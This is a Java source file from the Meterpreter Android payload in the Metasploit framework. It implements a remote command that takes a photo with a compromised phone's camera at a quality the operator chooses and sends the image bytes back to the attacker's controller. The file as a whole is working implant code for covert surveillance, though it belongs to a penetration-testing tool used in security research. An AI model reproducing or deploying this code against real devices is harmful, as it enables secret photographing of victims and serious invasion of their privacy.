
package com.metasploit.meterpreter.android;

import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.stdapi_webcam_audio_record;

public class webcam_get_frame_android extends stdapi_webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_IMAGE = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_WEBCAM_QUALITY = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 3);

    private byte[] cameraData;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        int quality = request.getIntValue(TLV_TYPE_WEBCAM_QUALITY);

        if (webcam_start_android.camera == null) {
            return ERROR_FAILURE;
        }

        cameraData = null;
        Parameters params = webcam_start_android.camera.getParameters();
        params.set("jpeg-quality", quality);
        webcam_start_android.camera.setParameters(params);

        webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                cameraData = data;

                // Fix webcam_stream
                try {
                    camera.startPreview();
                } catch (Exception e) {
                }

                synchronized (webcam_get_frame_android.this) {
                    webcam_get_frame_android.this.notify();
                }
            }
        });

        synchronized (this) {
            wait(10000);
        }

        if (cameraData != null) {
            response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
        } else {
            return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }
}
